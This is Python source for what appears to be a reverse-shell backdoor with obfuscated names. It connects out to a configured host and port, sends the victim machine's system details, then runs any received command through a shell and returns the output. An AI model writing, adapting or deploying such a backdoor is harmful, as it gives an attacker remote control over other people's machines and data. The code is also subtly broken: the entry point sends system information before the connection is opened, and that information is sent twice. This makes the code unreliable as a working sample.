import socket
import subprocess as sp
import platform as plt
import psutil as ps

class V:
  def __init__(s, i, p):
    s.i = i
    s.p = p
    s.c = None

  def g_l_i(s):
    s_o = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s_o.connect(("8.8.8.8", 80))
    l_i = s_o.getsockname()[0]
    s_o.close()
    return l_i

  def c_t_s(s):
    l_i = s.g_l_i()
    s.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print("Msg: Client Initiated...")
    s.c.connect((s.i, s.p))
    print("Msg: Connection initiated...")

  def s_s_i(s):
    s_i = f"System: {plt.system()}\n"
    s_i += f"Node Name: {plt.node()}\n"
    s_i += f"Release: {plt.release()}\n"
    s_i += f"Version: {plt.version()}\n"
    s_i += f"Machine: {plt.machine()}\n"
    s_i += f"Processor: {plt.processor()}\n"

    s.c.send(s_i.encode())

  def o_i(s):
    s.s_s_i()
    while True:
        print("[+] Awaiting Shell Commands...")
        u_c = s.c.recv(1024).decode()

        if u_c.strip() == "exit":
            break

        if u_c.startswith("cd"):
            try:
                d_p = u_c.split(" ", 1)[1]
                sp.os.chdir(d_p)
                s.c.send(f"Changed directory to: {sp.os.getcwd()}".encode())
            except Exception as e:
                s.c.send(f"Error changing directory: {str(e)}".encode())
        else:
            o_p = sp.Popen(u_c, shell=True, stderr=sp.PIPE, stdout=sp.PIPE)
            o = o_p.stdout.read()
            o_e = o_p.stderr.read()

            print("[+] Sending Command Output...")
            if o == b"" and o_e == b"":
                s.c.send(b"client_msg: no visible output")
            else:
                s.c.send(o + o_e)

if __name__ == "__main__":
  a_i = '127.0.0.1'
  v = V(a_i, 4000)
  v.s_s_i()
  v.c_t_s()
  v.o_i()

